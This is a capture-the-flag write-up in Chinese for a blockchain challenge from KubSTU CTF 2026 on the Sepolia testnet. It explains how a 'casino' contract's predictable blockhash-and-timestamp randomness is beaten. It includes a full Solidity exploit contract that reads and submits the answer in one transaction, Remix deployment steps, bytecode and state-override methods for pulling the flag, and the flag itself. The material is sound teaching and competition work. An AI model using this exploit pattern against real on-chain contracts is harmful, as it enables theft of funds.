# WEB-3 赌场

> **分类：** Blockchain · **赛事：** KubSTU CTF 2026 Autumn

## 📌 题目

### 已知

网络：Ethereum Sepolia

Challenge contract：

```text
0xa8d58d2C110e84C5De16ce9530557a8f38137bCb
```

Flag 格式：

```text
KubSTU{...}
```

**附件：** [task.txt](../../../assets/Web/Web-3%20%D0%9A%D0%B0%D0%B7%D0%B8%D0%BD%D0%BE/task.txt)

## 🏁 解题思路

### 思路

合约要求你猜一个数：

```solidity
guess(uint8 answer)
```

如果 `answer == random()`，该地址就会被标记为已解出（solved），并可以调用 `getFlag()`。

问题在于 `random()` 是从公开的区块数据计算出来的：

```solidity
blockhash(block.number - 1)
block.timestamp
```

这并不是真正的随机。另一个合约可以在同一笔交易中调用 `random()`，拿到正确答案，并立即把它传给 `guess()`。

### Exploit

在 Remix 中创建一个文件 `BadRandomnessExploit.sol`：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IBadRandomnessChallenge {
    function guess(uint8 answer) external;
    function random() external view returns (uint8);
    function getFlag() external view returns (string memory);
}

contract BadRandomnessExploit {
    function solve(address challenge) external {
        uint8 answer = IBadRandomnessChallenge(challenge).random();
        IBadRandomnessChallenge(challenge).guess(answer);
    }

    function getFlag(address challenge) external view returns (string memory) {
        return IBadRandomnessChallenge(challenge).getFlag();
    }
}
```

### 通过 Remix 求解

1. 打开 `https://remix.ethereum.org/`。
2. 创建文件 `BadRandomnessExploit.sol`。
<img width="1378" height="560" alt="image" src="https://github.com/user-attachments/assets/56c39d40-d5d7-49f3-a45c-eee582394ced" />
3. 编译合约。
<img width="1243" height="480" alt="image" src="https://github.com/user-attachments/assets/d735c22d-89c3-416e-914f-d9aa5e65c40c" />
5. 在 `Deploy & Run Transactions` 标签页中选择 `Injected Provider - MetaMask`

6. 安装 MetaMask 扩展，选择 `Sepolia` 网络，并从某个水龙头（faucet）领取一些币（示例水龙头 - https://sepolia-faucet.pk910.de/ ）

<img width="730" height="521" alt="image" src="https://github.com/user-attachments/assets/c33479ce-ecc1-41eb-a662-25e756cf8c41" />

7. 部署 `BadRandomnessExploit`。
<img width="2550" height="1320" alt="Безымянный" src="https://github.com/user-attachments/assets/cd6eea0b-63ee-421b-8dd0-6c09cbd673fe" />

8. 调用：

```text
solve(0xa8d58d2C110e84C5De16ce9530557a8f38137bCb)
```

9. 交易成功之后，调用：

```text
getFlag(0xa8d58d2C110e84C5De16ce9530557a8f38137bCb)
```
<img width="2550" height="857" alt="Безымянный" src="https://github.com/user-attachments/assets/7f8f2e8f-7f9f-4b08-a46b-215f9abd575f" />

### Flag

```text
KubSTU{bad_randomness_same_tx}
```

---

### 社区 writeup（战队 mpei_larpers）

> **来源：** https://ctftime.org/writeup/41126 (CTFtime，用户 writeup) · **赛事：** KubSTU CTF 2026: Autumn

Sepolia 上部署了合约 0xa8d58d2C110e84C5De16ce9530557a8f38137bCb——一个「赌场」，flag 藏在一个「猜数字」游戏后面。`guess(uint8 answer)` 只有当答案等于下式时才接受

uint8(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))

然后把玩家标记进 `solved` 并开放 `getFlag()`。这个「随机」数的两个输入（上一个区块的哈希和时间戳）在整个区块内都不变，所以这个数完全可预测。攻击者合约在同一笔交易里调用 `random()`，紧接着用同一个值调用 `guess(...)`：两次调用看到的是同一个区块，校验总能通过。而「在一笔交易里读取值、在下一笔里去猜」的方案行不通——区块已经不一样了。这正是本题的要点；此处的 one-transaction 模式不是一个技巧，而是出题意图（intent）。

不过，flag 甚至不必去「赢」——它就躺在合约的运行时代码里。我用三种相互独立的方法把它取了出来，都得到同一个字符串：

1. `eth_getCode`——flag 字面量被烧进了字节码里（偏移 0x1fd 处的 PUSH32，长度 0x1e，正是 `getFlag()` 返回的内容）。在公开区块链上没有「private」可言。
2. `eth_call getFlag()` 配合一个 state override，把我们的地址标记为已解出：活着的合约自己执行其 success 分支并返回 flag。没有 override 时，同一个调用会以 `Solve first ` 回滚。
3. 一个 Foundry fork-test，针对真实的已部署代码重放诚实的 exploit（调用 `random()`、猜、`getFlag()`）：`[PASS]`，日志里有 flag。

哪里都不需要私钥、水龙头或已充值的账户。我还现场演示了可预测性：对区块 11883331，`random()` 的值 = 62；`eth_call guess(62)` 通过，而对照组 `guess(63)` 以 `Wrong guess` 回滚。这与攻击者合约在同一笔交易内看到的是同一个预言机（oracle）。

用于与 dispatcher 对照的选择器：getFlag()=0xf9633930，guess(uint8)=0x4ba4c16b，random()=0x5ec01e4d，solved(address)=0x5e36bdc6。

Flag：`KubSTU{bad_randomness_same_tx}`

**Flag:** `KubSTU{bad_randomness_same_tx}`
